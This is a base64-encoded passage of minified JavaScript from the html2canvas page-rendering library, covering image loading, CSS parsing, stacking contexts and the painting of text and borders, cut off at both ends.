ih0KXt2YXIgZT1udWxsO3JldHVybiB0aGlzLmltYWdlcy5zb21lKGZ1bmN0aW9uKG4pe3JldHVybihlPW4pLnNyYz09PXR9KT9lOm51bGx9LG0ucHJvdG90eXBlLmZldGNoPWZ1bmN0aW9uKHQpe3JldHVybiB0aGlzLmltYWdlcz10LnJlZHVjZShpZSh0aGlzLmZpbmRCYWNrZ3JvdW5kSW1hZ2UsdGhpcyksdGhpcy5maW5kSW1hZ2VzKHQpKSx0aGlzLmltYWdlcy5mb3JFYWNoKGZ1bmN0aW9uKHQsZSl7dC5wcm9taXNlLnRoZW4oZnVuY3Rpb24oKXtFKCJTdWNjZXNmdWxseSBsb2FkZWQgaW1hZ2UgIyIrKGUrMSkpfSxmdW5jdGlvbigpe0UoIkZhaWxlZCBsb2FkaW5nIGltYWdlICMiKyhlKzEpKX0pfSksdGhpcy5yZWFkeT1Qcm9taXNlLmFsbCh0aGlzLmltYWdlcy5tYXAodGhpcy5nZXRQcm9taXNlKSksRSgiRmluaXNoZWQgc2VhcmNoaW5nIGltYWdlcyIpLHRoaXN9LHgucHJvdG90eXBlPU9iamVjdC5jcmVhdGUoZi5wcm90b3R5cGUpLHgucHJvdG90eXBlLnN0ZXBSZWdFeHA9LygoPzpyZ2J8cmdiYSlcKFxkezEsM30sXHNcZHsxLDN9LFxzXGR7MSwzfSg/Oixcc1swLTlcLl0rKT9cKSlccyooXGR7MSwzfSk/KCV8cHgpPy8sVC5wcm90b3R5cGUuYXNzaWduU3RhY2s9ZnVuY3Rpb24odCl7dGhpcy5zdGFjaz10LHQuY2hpbGRyZW4ucHVzaCh0aGlzKX0sVC5wcm90b3R5cGUuaXNFbGVtZW50VmlzaWJsZT1mdW5jdGlvbigpe3JldHVybiB0aGlzLm5vZGUubm9kZVR5cGU9PT1Ob2RlLlRFWFRfTk9ERT90aGlzLnBhcmVudC52aXNpYmxlOiJub25lIiE9PXRoaXMuY3NzKCJkaXNwbGF5IikmJiJoaWRkZW4iIT09dGhpcy5jc3MoInZpc2liaWxpdHkiKSYmIXRoaXMubm9kZS5oYXNBdHRyaWJ1dGUoImRhdGEtaHRtbDJjYW52YXMtaWdub3JlIil9LFQucHJvdG90eXBlLmNzcz1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5jb21wdXRlZFN0eWxlc3x8KHRoaXMuY29tcHV0ZWRTdHlsZXM9dGhpcy5jb21wdXRlZFN0eWxlKG51bGwpKSx0aGlzLnN0eWxlc1t0XXx8KHRoaXMuc3R5bGVzW3RdPXRoaXMuY29tcHV0ZWRTdHlsZXNbdF0pfSxULnByb3RvdHlwZS5wcmVmaXhlZENzcz1mdW5jdGlvbih0KXt2YXIgZT1bIndlYmtpdCIsIm1veiIsIm1zIiwibyJdLHI9dGhpcy5jc3ModCk7cmV0dXJuIHI9PT1uJiZlLnNvbWUoZnVuY3Rpb24oZSl7cmV0dXJuIHI9dGhpcy5jc3MoZSt0LnN1YnN0cigwLDEpLnRvVXBwZXJDYXNlKCkrdC5zdWJzdHIoMSkpLHIhPT1ufSx0aGlzKSxyPT09bj9udWxsOnJ9LFQucHJvdG90eXBlLmNvbXB1dGVkU3R5bGU9ZnVuY3Rpb24odCl7cmV0dXJuIHRoaXMubm9kZS5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3LmdldENvbXB1dGVkU3R5bGUodGhpcy5ub2RlLHQpfSxULnByb3RvdHlwZS5jc3NJbnQ9ZnVuY3Rpb24odCl7dmFyIGU9cGFyc2VJbnQodGhpcy5jc3ModCksMTApO3JldHVybiBpc05hTihlKT8wOmV9LFQucHJvdG90eXBlLmNzc0Zsb2F0PWZ1bmN0aW9uKHQpe3ZhciBlPXBhcnNlRmxvYXQodGhpcy5jc3ModCkpO3JldHVybiBpc05hTihlKT8wOmV9LFQucHJvdG90eXBlLmZvbnRXZWlnaHQ9ZnVuY3Rpb24oKXt2YXIgdD10aGlzLmNzcygiZm9udFdlaWdodCIpO3N3aXRjaChwYXJzZUludCh0LDEwKSl7Y2FzZSA0MDE6dD0iYm9sZCI7YnJlYWs7Y2FzZSA0MDA6dD0ibm9ybWFsIn1yZXR1cm4gdH0sVC5wcm90b3R5cGUucGFyc2VCYWNrZ3JvdW5kSW1hZ2VzPWZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuYmFja2dyb3VuZEltYWdlc3x8KHRoaXMuYmFja2dyb3VuZEltYWdlcz1TKHRoaXMuY3NzKCJiYWNrZ3JvdW5kSW1hZ2UiKSkpfSxULnByb3RvdHlwZS5jc3NMaXN0PWZ1bmN0aW9uKHQsZSl7dmFyIG49KHRoaXMuY3NzKHQpfHwiIikuc3BsaXQoIiwiKTtyZXR1cm4gbj1uW2V8fDBdfHxuWzBdfHwiYXV0byIsbj1uLnRyaW0oKS5zcGxpdCgiICIpLDE9PT1uLmxlbmd0aCYmKG49W25bMF0sblswXV0pLG59LFQucHJvdG90eXBlLnBhcnNlQmFja2dyb3VuZFNpemU9ZnVuY3Rpb24odCxlLG4pe3ZhciByLGksbz10aGlzLmNzc0xpc3QoImJhY2tncm91bmRTaXplIixuKTtpZihJKG9bMF0pKXI9dC53aWR0aCpwYXJzZUZsb2F0KG9bMF0pLzEwMDtlbHNle2lmKC9jb250YWlufGNvdmVyLy50ZXN0KG9bMF0pKXt2YXIgcz10LndpZHRoL3QuaGVpZ2h0LGE9ZS53aWR0aC9lLmhlaWdodDtyZXR1cm4gYT5zXiJjb250YWluIj09PW9bMF0/e3dpZHRoOnQuaGVpZ2h0KmEsaGVpZ2h0OnQuaGVpZ2h0fTp7d2lkdGg6dC53aWR0aCxoZWlnaHQ6dC53aWR0aC9hfX1yPXBhcnNlSW50KG9bMF0sMTApfXJldHVybiBpPSJhdXRvIj09PW9bMF0mJiJhdXRvIj09PW9bMV0/ZS5oZWlnaHQ6ImF1dG8iPT09b1sxXT9yL2Uud2lkdGgqZS5oZWlnaHQ6SShvWzFdKT90LmhlaWdodCpwYXJzZUZsb2F0KG9bMV0pLzEwMDpwYXJzZUludChvWzFdLDEwKSwiYXV0byI9PT1vWzBdJiYocj1pL2UuaGVpZ2h0KmUud2lkdGgpLHt3aWR0aDpyLGhlaWdodDppfX0sVC5wcm90b3R5cGUucGFyc2VCYWNrZ3JvdW5kUG9zaXRpb249ZnVuY3Rpb24odCxlLG4scil7dmFyIGksbyxzPXRoaXMuY3NzTGlzdCgiYmFja2dyb3VuZFBvc2l0aW9uIixuKTtyZXR1cm4gaT1JKHNbMF0pPyh0LndpZHRoLShyfHxlKS53aWR0aCkqKHBhcnNlRmxvYXQoc1swXSkvMTAwKTpwYXJzZUludChzWzBdLDEwKSxvPSJhdXRvIj09PXNbMV0/aS9lLndpZHRoKmUuaGVpZ2h0Okkoc1sxXSk/KHQuaGVpZ2h0LShyfHxlKS5oZWlnaHQpKnBhcnNlRmxvYXQoc1sxXSkvMTAwOnBhcnNlSW50KHNbMV0sMTApLCJhdXRvIj09PXNbMF0mJihpPW8vZS5oZWlnaHQqZS53aWR0aCkse2xlZnQ6aSx0b3A6b319LFQucHJvdG90eXBlLnBhcnNlQmFja2dyb3VuZFJlcGVhdD1mdW5jdGlvbih0KXtyZXR1cm4gdGhpcy5jc3NMaXN0KCJiYWNrZ3JvdW5kUmVwZWF0Iix0KVswXX0sVC5wcm90b3R5cGUucGFyc2VUZXh0U2hhZG93cz1mdW5jdGlvbigpe3ZhciB0PXRoaXMuY3NzKCJ0ZXh0U2hhZG93IiksZT1bXTtpZih0JiYibm9uZSIhPT10KWZvcih2YXIgbj10Lm1hdGNoKHRoaXMuVEVYVF9TSEFET1dfUFJPUEVSVFkpLHI9MDtuJiZyPG4ubGVuZ3RoO3IrKyl7dmFyIGk9bltyXS5tYXRjaCh0aGlzLlRFWFRfU0hBRE9XX1ZBTFVFUyk7ZS5wdXNoKHtjb2xvcjppWzBdLG9mZnNldFg6aVsxXT9pWzFdLnJlcGxhY2UoInB4IiwiIik6MCxvZmZzZXRZOmlbMl0/aVsyXS5yZXBsYWNlKCJweCIsIiIpOjAsYmx1cjppWzNdP2lbM10ucmVwbGFjZSgicHgiLCIiKTowfSl9cmV0dXJuIGV9LFQucHJvdG90eXBlLnBhcnNlVHJhbnNmb3JtPWZ1bmN0aW9uKCl7aWYoIXRoaXMudHJhbnNmb3JtRGF0YSlpZih0aGlzLmhhc1RyYW5zZm9ybSgpKXt2YXIgdD10aGlzLnBhcnNlQm91bmRzKCksZT10aGlzLnByZWZpeGVkQ3NzKCJ0cmFuc2Zvcm1PcmlnaW4iKS5zcGxpdCgiICIpLm1hcChSKS5tYXAoTyk7ZVswXSs9dC5sZWZ0LGVbMV0rPXQudG9wLHRoaXMudHJhbnNmb3JtRGF0YT17b3JpZ2luOmUsbWF0cml4OnRoaXMucGFyc2VUcmFuc2Zvcm1NYXRyaXgoKX19ZWxzZSB0aGlzLnRyYW5zZm9ybURhdGE9e29yaWdpbjpbMCwwXSxtYXRyaXg6WzEsMCwwLDEsMCwwXX07cmV0dXJuIHRoaXMudHJhbnNmb3JtRGF0YX0sVC5wcm90b3R5cGUucGFyc2VUcmFuc2Zvcm1NYXRyaXg9ZnVuY3Rpb24oKXtpZighdGhpcy50cmFuc2Zvcm1NYXRyaXgpe3ZhciB0PXRoaXMucHJlZml4ZWRDc3MoInRyYW5zZm9ybSIpLGU9dD9rKHQubWF0Y2godGhpcy5NQVRSSVhfUFJPUEVSVFkpKTpudWxsO3RoaXMudHJhbnNmb3JtTWF0cml4PWU/ZTpbMSwwLDAsMSwwLDBdfXJldHVybiB0aGlzLnRyYW5zZm9ybU1hdHJpeH0sVC5wcm90b3R5cGUucGFyc2VCb3VuZHM9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5ib3VuZHN8fCh0aGlzLmJvdW5kcz10aGlzLmhhc1RyYW5zZm9ybSgpP00odGhpcy5ub2RlKTpCKHRoaXMubm9kZSkpfSxULnByb3RvdHlwZS5oYXNUcmFuc2Zvcm09ZnVuY3Rpb24oKXtyZXR1cm4iMSwwLDAsMSwwLDAiIT09dGhpcy5wYXJzZVRyYW5zZm9ybU1hdHJpeCgpLmpvaW4oIiwiKXx8dGhpcy5wYXJlbnQmJnRoaXMucGFyZW50Lmhhc1RyYW5zZm9ybSgpfSxULnByb3RvdHlwZS5nZXRWYWx1ZT1mdW5jdGlvbigpe3ZhciB0PXRoaXMubm9kZS52YWx1ZXx8IiI7cmV0dXJuIHQ9IlNFTEVDVCI9PT10aGlzLm5vZGUudGFnTmFtZT9DKHRoaXMubm9kZSk6dCwwPT09dC5sZW5ndGg/dGhpcy5ub2RlLnBsYWNlaG9sZGVyfHwiIjp0fSxULnByb3RvdHlwZS5NQVRSSVhfUFJPUEVSVFk9LyhtYXRyaXgpXCgoLispXCkvLFQucHJvdG90eXBlLlRFWFRfU0hBRE9XX1BST1BFUlRZPS8oKHJnYmF8cmdiKVwoW15cKV0rXCkoXHMtP1xkK3B4KXswLH0pL2csVC5wcm90b3R5cGUuVEVYVF9TSEFET1dfVkFMVUVTPS8oLT9cZCtweCl8KCMuKyl8KHJnYlwoLitcKSl8KHJnYmFcKC4rXCkpL2csUC5wcm90b3R5cGUuYXN5bmNSZW5kZXJlcj1mdW5jdGlvbih0LGUsbil7bj1ufHxEYXRlLm5vdygpLHRoaXMucGFpbnQodFt0aGlzLnJlbmRlckluZGV4KytdKSx0Lmxlbmd0aD09PXRoaXMucmVuZGVySW5kZXg/ZSgpOm4rMjA+RGF0ZS5ub3coKT90aGlzLmFzeW5jUmVuZGVyZXIodCxlLG4pOnNldFRpbWVvdXQoaWUoZnVuY3Rpb24oKXt0aGlzLmFzeW5jUmVuZGVyZXIodCxlKX0sdGhpcyksMCl9LFAucHJvdG90eXBlLmNyZWF0ZVBzZXVkb0hpZGVTdHlsZXM9ZnVuY3Rpb24odCl7dmFyIGU9dC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpO2UuaW5uZXJIVE1MPSIuIit0aGlzLnBzZXVkb0hpZGVDbGFzcysnOmJlZm9yZSB7IGNvbnRlbnQ6ICIiICFpbXBvcnRhbnQ7IGRpc3BsYXk6IG5vbmUgIWltcG9ydGFudDsgfS4nK3RoaXMucHNldWRvSGlkZUNsYXNzKyc6YWZ0ZXIgeyBjb250ZW50OiAiIiAhaW1wb3J0YW50OyBkaXNwbGF5OiBub25lICFpbXBvcnRhbnQ7IH0nLHQuYm9keS5hcHBlbmRDaGlsZChlKX0sUC5wcm90b3R5cGUuZ2V0UHNldWRvRWxlbWVudHM9ZnVuY3Rpb24odCl7dmFyIGU9W1t0XV07aWYodC5ub2RlLm5vZGVUeXBlPT09Tm9kZS5FTEVNRU5UX05PREUpe3ZhciBuPXRoaXMuZ2V0UHNldWRvRWxlbWVudCh0LCI6YmVmb3JlIikscj10aGlzLmdldFBzZXVkb0VsZW1lbnQodCwiOmFmdGVyIik7biYmKHQubm9kZS5pbnNlcnRCZWZvcmUoblswXS5ub2RlLHQubm9kZS5maXJzdENoaWxkKSxlLnB1c2gobikpLHImJih0Lm5vZGUuYXBwZW5kQ2hpbGQoclswXS5ub2RlKSxlLnB1c2gocikpLChufHxyKSYmKHQubm9kZS5jbGFzc05hbWUrPSIgIit0aGlzLnBzZXVkb0hpZGVDbGFzcyl9cmV0dXJuIGNlKGUpfSxQLnByb3RvdHlwZS5nZXRQc2V1ZG9FbGVtZW50PWZ1bmN0aW9uKHQsbil7dmFyIHI9dC5jb21wdXRlZFN0eWxlKG4pO2lmKCFyfHwhci5jb250ZW50fHwibm9uZSI9PT1yLmNvbnRlbnR8fCItbW96LWFsdC1jb250ZW50Ij09PXIuY29udGVudHx8Im5vbmUiPT09ci5kaXNwbGF5KXJldHVybiBudWxsO2Zvcih2YXIgaT1oZShyLmNvbnRlbnQpLG89InVybCI9PT1pLnN1YnN0cigwLDMpLHM9ZS5jcmVhdGVFbGVtZW50KG8/ImltZyI6Imh0bWwyY2FudmFzcHNldWRvZWxlbWVudCIpLGE9bmV3IFQocyx0KSxjPXIubGVuZ3RoLTE7Yz49MDtjLS0pe3ZhciBoPUEoci5pdGVtKGMpKTtzLnN0eWxlW2hdPXJbaF19aWYocy5jbGFzc05hbWU9dGhpcy5wc2V1ZG9IaWRlQ2xhc3MsbylyZXR1cm4gcy5zcmM9UyhpKVswXS5hcmdzWzBdLFthXTt2YXIgdT1lLmNyZWF0ZVRleHROb2RlKGkpO3JldHVybiBzLmFwcGVuZENoaWxkKHUpLFthLG5ldyB5ZSh1LGEpXX0sUC5wcm90b3R5cGUuZ2V0Q2hpbGRyZW49ZnVuY3Rpb24odCl7cmV0dXJuIGNlKFtdLmZpbHRlci5jYWxsKHQubm9kZS5jaGlsZE5vZGVzLFEpLm1hcChmdW5jdGlvbihlKXt2YXIgbj1bZS5ub2RlVHlwZT09PU5vZGUuVEVYVF9OT0RFP25ldyB5ZShlLHQpOm5ldyBUKGUsdCldLmZpbHRlcihhZSk7cmV0dXJuIGUubm9kZVR5cGU9PT1Ob2RlLkVMRU1FTlRfTk9ERSYmbi5sZW5ndGgmJiJURVhUQVJFQSIhPT1lLnRhZ05hbWU/blswXS5pc0VsZW1lbnRWaXNpYmxlKCk/bi5jb25jYXQodGhpcy5nZXRDaGlsZHJlbihuWzBdKSk6W106bn0sdGhpcykpfSxQLnByb3RvdHlwZS5uZXdTdGFja2luZ0NvbnRleHQ9ZnVuY3Rpb24odCxlKXt2YXIgbj1uZXcgbGUoZSx0LmNzc0Zsb2F0KCJvcGFjaXR5IiksdC5ub2RlLHQucGFyZW50KTtuLnZpc2libGU9dC52aXNpYmxlO3ZhciByPWU/bi5nZXRQYXJlbnRTdGFjayh0aGlzKTpuLnBhcmVudC5zdGFjaztyLmNvbnRleHRzLnB1c2gobiksdC5zdGFjaz1ufSxQLnByb3RvdHlwZS5jcmVhdGVTdGFja2luZ0NvbnRleHRzPWZ1bmN0aW9uKCl7dGhpcy5ub2Rlcy5mb3JFYWNoKGZ1bmN0aW9uKHQpe3RlKHQpJiYodGhpcy5pc1Jvb3RFbGVtZW50KHQpfHxyZSh0KXx8cSh0KXx8dGhpcy5pc0JvZHlXaXRoVHJhbnNwYXJlbnRSb290KHQpfHx0Lmhhc1RyYW5zZm9ybSgpKT90aGlzLm5ld1N0YWNraW5nQ29udGV4dCh0LCEwKTp0ZSh0KSYmKCQodCkmJlYodCl8fEsodCl8fEoodCkpP3RoaXMubmV3U3RhY2tpbmdDb250ZXh0KHQsITEpOnQuYXNzaWduU3RhY2sodC5wYXJlbnQuc3RhY2spfSx0aGlzKX0sUC5wcm90b3R5cGUuaXNCb2R5V2l0aFRyYW5zcGFyZW50Um9vdD1mdW5jdGlvbih0KXtyZXR1cm4iQk9EWSI9PT10Lm5vZGUubm9kZU5hbWUmJnRoaXMucmVuZGVyZXIuaXNUcmFuc3BhcmVudCh0LnBhcmVudC5jc3MoImJhY2tncm91bmRDb2xvciIpKX0sUC5wcm90b3R5cGUuaXNSb290RWxlbWVudD1mdW5jdGlvbih0KXtyZXR1cm4gbnVsbD09PXQucGFyZW50fSxQLnByb3RvdHlwZS5zb3J0U3RhY2tpbmdDb250ZXh0cz1mdW5jdGlvbih0KXt0LmNvbnRleHRzLnNvcnQobmUpLHQuY29udGV4dHMuZm9yRWFjaCh0aGlzLnNvcnRTdGFja2luZ0NvbnRleHRzLHRoaXMpfSxQLnByb3RvdHlwZS5wYXJzZVRleHRCb3VuZHM9ZnVuY3Rpb24odCl7cmV0dXJuIGZ1bmN0aW9uKGUsbixyKXtpZigibm9uZSIhPT10LnBhcmVudC5jc3MoInRleHREZWNvcmF0aW9uIikuc3Vic3RyKDAsNCl8fDAhPT1lLnRyaW0oKS5sZW5ndGgpe2lmKHRoaXMuc3VwcG9ydC5yYW5nZUJvdW5kcyYmIXQucGFyZW50Lmhhc1RyYW5zZm9ybSgpKXt2YXIgaT1yLnNsaWNlKDAsbikuam9pbigiIikubGVuZ3RoO3JldHVybiB0aGlzLmdldFJhbmdlQm91bmRzKHQubm9kZSxpLGUubGVuZ3RoKX1pZih0Lm5vZGUmJiJzdHJpbmciPT10eXBlb2YgdC5ub2RlLmRhdGEpe3ZhciBvPXQubm9kZS5zcGxpdFRleHQoZS5sZW5ndGgpLHM9dGhpcy5nZXRXcmFwcGVyQm91bmRzKHQubm9kZSx0LnBhcmVudC5oYXNUcmFuc2Zvcm0oKSk7cmV0dXJuIHQubm9kZT1vLHN9fWVsc2UoIXRoaXMuc3VwcG9ydC5yYW5nZUJvdW5kc3x8dC5wYXJlbnQuaGFzVHJhbnNmb3JtKCkpJiYodC5ub2RlPXQubm9kZS5zcGxpdFRleHQoZS5sZW5ndGgpKTtyZXR1cm57fX19LFAucHJvdG90eXBlLmdldFdyYXBwZXJCb3VuZHM9ZnVuY3Rpb24odCxlKXt2YXIgbj10Lm93bmVyRG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaHRtbDJjYW52YXN3cmFwcGVyIikscj10LnBhcmVudE5vZGUsaT10LmNsb25lTm9kZSghMCk7bi5hcHBlbmRDaGlsZCh0LmNsb25lTm9kZSghMCkpLHIucmVwbGFjZUNoaWxkKG4sdCk7dmFyIG89ZT9NKG4pOkIobik7cmV0dXJuIHIucmVwbGFjZUNoaWxkKGksbiksb30sUC5wcm90b3R5cGUuZ2V0UmFuZ2VCb3VuZHM9ZnVuY3Rpb24odCxlLG4pe3ZhciByPXRoaXMucmFuZ2V8fCh0aGlzLnJhbmdlPXQub3duZXJEb2N1bWVudC5jcmVhdGVSYW5nZSgpKTtyZXR1cm4gci5zZXRTdGFydCh0LGUpLHIuc2V0RW5kKHQsZStuKSxyLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpfSxQLnByb3RvdHlwZS5wYXJzZT1mdW5jdGlvbih0KXt2YXIgZT10LmNvbnRleHRzLmZpbHRlcihIKSxuPXQuY2hpbGRyZW4uZmlsdGVyKHRlKSxyPW4uZmlsdGVyKFooSikpLGk9ci5maWx0ZXIoWigkKSkuZmlsdGVyKFooeikpLG89bi5maWx0ZXIoWigkKSkuZmlsdGVyKEopLHM9ci5maWx0ZXIoWigkKSkuZmlsdGVyKHopLGE9dC5jb250ZXh0cy5jb25jYXQoci5maWx0ZXIoJCkpLmZpbHRlcihWKSxjPXQuY2hpbGRyZW4uZmlsdGVyKGVlKS5maWx0ZXIoWCksaD10LmNvbnRleHRzLmZpbHRlcihqKTtlLmNvbmNhdChpKS5jb25jYXQobykuY29uY2F0KHMpLmNvbmNhdChhKS5jb25jYXQoYykuY29uY2F0KGgpLmZvckVhY2goZnVuY3Rpb24odCl7dGhpcy5yZW5kZXJRdWV1ZS5wdXNoKHQpLFkodCkmJih0aGlzLnBhcnNlKHQpLHRoaXMucmVuZGVyUXVldWUucHVzaChuZXcgTikpfSx0aGlzKX0sUC5wcm90b3R5cGUucGFpbnQ9ZnVuY3Rpb24odCl7dHJ5e3QgaW5zdGFuY2VvZiBOP3RoaXMucmVuZGVyZXIuY3R4LnJlc3RvcmUoKTplZSh0KT90aGlzLnBhaW50VGV4dCh0KTp0aGlzLnBhaW50Tm9kZSh0KX1jYXRjaChlKXtFKGUpfX0sUC5wcm90b3R5cGUucGFpbnROb2RlPWZ1bmN0aW9uKHQpe1kodCkmJih0aGlzLnJlbmRlcmVyLnNldE9wYWNpdHkodC5vcGFjaXR5KSx0aGlzLnJlbmRlcmVyLmN0eC5zYXZlKCksdC5oYXNUcmFuc2Zvcm0oKSYmdGhpcy5yZW5kZXJlci5zZXRUcmFuc2Zvcm0odC5wYXJzZVRyYW5zZm9ybSgpKSk7dmFyIGU9dC5wYXJzZUJvdW5kcygpLG49dGhpcy5wYXJzZUJvcmRlcnModCk7c3dpdGNoKHRoaXMucmVuZGVyZXIuY2xpcChuLmNsaXAsZnVuY3Rpb24oKXt0aGlzLnJlbmRlcmVyLnJlbmRlckJhY2tncm91bmQodCxlLG4uYm9yZGVycy5tYXAoc2UpKX0sdGhpcyksdGhpcy5yZW5kZXJlci5yZW5kZXJCb3JkZXJzKG4uYm9yZGVycyksdC5ub2RlLm5vZGVOYW1lKXtjYXNlInN2ZyI6dmFyIHI9dGhpcy5pbWFnZXMuZ2V0KHQubm9kZSk7cj90aGlzLnJlbmRlcmVyLnJlbmRlckltYWdlKHQsZSxuLHIpOkUoIkVycm9yIGxvYWRpbmcgPHN2Zz4iLHQubm9kZSk7YnJlYWs7Y2FzZSJJTUciOnZhciBpPXRoaXMuaW1hZ2VzLmdldCh0Lm5vZGUuc3JjKTtpP3RoaXMucmVuZGVyZXIucmVuZGVySW1hZ2UodCxlLG4saSk6RSgiRXJyb3IgbG9hZGluZyA8aW1nPiIsdC5ub2RlLnNyYyk7YnJlYWs7Y2FzZSJTRUxFQ1QiOmNhc2UiSU5QVVQiOmNhc2UiVEVYVEFSRUEiOnRoaXMucGFpbnRGb3JtVmFsdWUodCl9fSxQLnByb3RvdHlwZS5wYWludEZvcm1WYWx1ZT1mdW5jdGlvbih0KXtpZih0LmdldFZhbHVlKCkubGVuZ3RoPjApe3ZhciBlPXQubm9kZS5vd25lckRvY3VtZW50LG49ZS5jcmVhdGVFbGVtZW50KCJodG1sMmNhbnZhc3dyYXBwZXIiKSxyPVsibGluZUhlaWdodCIsInRleHRBbGlnbiIsImZvbnRGYW1pbHkiLCJmb250V2VpZ2h0IiwiZm9udFNpemUiLCJjb2xvciIsInBhZGRpbmdMZWZ0IiwicGFkZGluZ1RvcCIsInBhZGRpbmdSaWdodCIsInBhZGRpbmdCb3R0b20iLCJ3aWR0aCIsImhlaWdodCIsImJvcmRlckxlZnRTdHlsZSIsImJvcmRlclRvcFN0eWxlIiwiYm9yZGVyTGVmdFdpZHRoIiwiYm9yZGVyVG9wV2lkdGgiLCJib3hTaXppbmciLCJ3aGl0ZVNwYWNlIiwid29yZFdyYXAiXTsKci5mb3JFYWNoKGZ1bmN0aW9uKGUpe3RyeXtuLnN0eWxlW2VdPXQuY3NzKGUpfWNhdGNoKHIpe0UoImh0bWwyY2FudmFzOiBQYXJzZTogRXhjZXB0aW9uIGNhdWdodCBpbiByZW5kZXJGb3JtVmFsdWU6ICIrci5tZXNzYWdlKX19KTt2YXIgaT10LnBhcnNlQm91bmRzKCk7bi5zdHlsZS5wb3NpdGlvbj0iYWJzb2x1dGUiLG4uc3R5bGUubGVmdD1pLmxlZnQrInB4IixuLnN0eWxlLnRvcD1pLnRvcCsicHgiLG4udGV4dENvbnRlbnQ9dC5nZXRWYWx1ZSgpLGUuYm9keS5hcHBlbmRDaGlsZChuKSx0aGlzLnBhaW50VGV4dChuZXcgeWUobi5maXJzdENoaWxkLHQpKSxlLmJvZHkucmVtb3ZlQ2hpbGQobil9fSxQLnByb3RvdHlwZS5wYWludFRleHQ9ZnVuY3Rpb24odCl7dC5hcHBseVRleHRUcmFuc2Zvcm0oKTt2YXIgZT10Lm5vZGUuZGF0YS5zcGxpdCghdGhpcy5vcHRpb25zLmxldHRlclJlbmRlcmluZ3x8Ryh0KT8vKFxifCApLzoiIiksbj10LnBhcmVudC5mb250V2VpZ2h0KCkscj10LnBhcmVudC5jc3MoImZvbnRTaXplIiksaT10LnBhcmVudC5jc3MoImZvbnRGYW1pbHkiKSxvPXQucGFyZW50LnBhcnNlVGV4dFNoYWRvd3MoKTt0aGlzLnJlbmRlcmVyLmZvbnQodC5wYXJlbnQuY3NzKCJjb2xvciIpLHQucGFyZW50LmNzcygiZm9udFN0eWxlIiksdC5wYXJlbnQuY3NzKCJmb250VmFyaWFudCIpLG4scixpKSxvLmxlbmd0aD90aGlzLnJlbmRlcmVyLmZvbnRTaGFkb3cob1swXS5jb2xvcixvWzBdLm9mZnNldFgsb1swXS5vZmZzZXRZLG9bMF0uYmx1cik6dGhpcy5yZW5kZXJlci5jbGVhclNoYWRvdygpLGUubWFwKHRoaXMucGFyc2VUZXh0Qm91bmRzKHQpLHRoaXMpLmZvckVhY2goZnVuY3Rpb24obixvKXtuJiYodGhpcy5yZW5kZXJlci50ZXh0KGVbb10sbi5sZWZ0LG4uYm90dG9tKSx0aGlzLnJlbmRlclRleHREZWNvcmF0aW9uKHQucGFyZW50LG4sdGhpcy5mb250TWV0cmljcy5nZXRNZXRyaWNzKGkscikpKX0sdGhpcyl9LFAucHJvdG90eXBlLnJlbmRlclRleHREZWNvcmF0aW9uPWZ1bmN0aW9uKHQsZSxuKXtzd2l0Y2godC5jc3MoInRleHREZWNvcmF0aW9uIikuc3BsaXQoIiAiKVswXSl7Y2FzZSJ1bmRlcmxpbmUiOnRoaXMucmVuZGVyZXIucmVjdGFuZ2xlKGUubGVmdCxNYXRoLnJvdW5kKGUudG9wK24uYmFzZWxpbmUrbi5saW5lV2lkdGgpLGUud2lkdGgsMSx0LmNzcygiY29sb3IiKSk7YnJlYWs7Y2FzZSJvdmVybGluZSI6dGhpcy5yZW5kZXJlci5yZWN0YW5nbGUoZS5sZWZ0LE1hdGgucm91bmQoZS50b3ApLGUud2lkdGgsMSx0LmNzcygiY29sb3IiKSk7YnJlYWs7Y2FzZSJsaW5lLXRocm91Z2giOnRoaXMucmVuZGVyZXIucmVjdGFuZ2xlKGUubGVmdCxNYXRoLmNlaWwoZS50b3Arbi5taWRkbGUrbi5saW5lV2lkdGgpLGUud2lkdGgsMSx0LmNzcygiY29sb3IiKSl9fSxQLnByb3RvdHlwZS5wYXJzZUJvcmRlcnM9ZnVuY3Rpb24odCl7dmFyIGU9dC5ib3VuZHMsbj1VKHQpLHI9WyJUb3AiLCJSaWdodCIsIkJvdHRvbSIsIkxlZnQiXS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJue3dpZHRoOnQuY3NzSW50KCJib3JkZXIiK2UrIldpZHRoIiksY29sb3I6dC5jc3MoImJvcmRlciIrZSsiQ29sb3IiKSxhcmdzOm51bGx9fSksaT1EKGUsbixyKTtyZXR1cm57Y2xpcDp0aGlzLnBhcnNlQmFja2dyb3VuZENsaXAodCxpLHIsbixlKSxib3JkZXJzOnIubWFwKGZ1bmN0aW9uKHQsbyl7aWYodC53aWR0aD4wKXt2YXIgcz1lLmxlZnQsYT1lLnRvcCxjPWUud2lkdGgsaD1lLmhlaWdodC1yWzJdLndpZHRoO3N3aXRjaChvKXtjYXNlIDA6aD1yWzBdLndpZHRoLHQuYXJncz1GKHtjMTpbcyxhXSxjMjpbcytjLGFdLGMzOltzK2MtclsxXS53aWR0aCxhK2hdLGM0OltzK3JbM10ud2lkdGgsYStoXX0sblswXSxuWzFdLGkudG9wTGVmdE91dGVyLGkudG9wTGVmdElubmVyLGkudG9wUmlnaHRPdXRlcixpLnRvcFJpZ2h0SW5uZXIpO2JyZWFrO2Nhc2UgMTpzPWUubGVmdCtlLndpZHRoLXJbMV0ud2lkdGgsYz1yWzFdLndpZHRoLHQuYXJncz1GKHtjMTpbcytjLGFdLGMyOltzK2MsYStoK3JbMl0ud2lkdGhdLGMzOltzLGEraF0sYzQ6W3MsYStyWzBdLndpZHRoXX0sblsxXSxuWzJdLGkudG9wUmlnaHRPdXRlcixpLnRvcFJpZ2h0SW5uZXIsaS5ib3R0b21SaWdodE91dGVyLGkuYm90dG9tUmlnaHRJbm5lcik7YnJlYWs7Y2FzZSAyOmE9YStlLmhlaWdodC1yWzJdLndpZHRoLGg9clsyXS53aWR0aCx0LmFyZ3M9Rih7YzE6W3MrYyxhK2hdLGMyOltzLGEraF0sYzM6W3MrclszXS53aWR0aCxhXSxjNDpbcytjLXJbM10ud2lkdGgsYV19LG5bMl0sblszXSxpLmJvdHRvbVJpZ2h0T3V0ZXIsaS5ib3R0b21SaWdodElubmVyLGkuYm90dG9tTGVmdE91dGVyLGkuYm90dG9tTGVmdElubmVyKTticmVhaztjYXNlIDM6Yz1yWz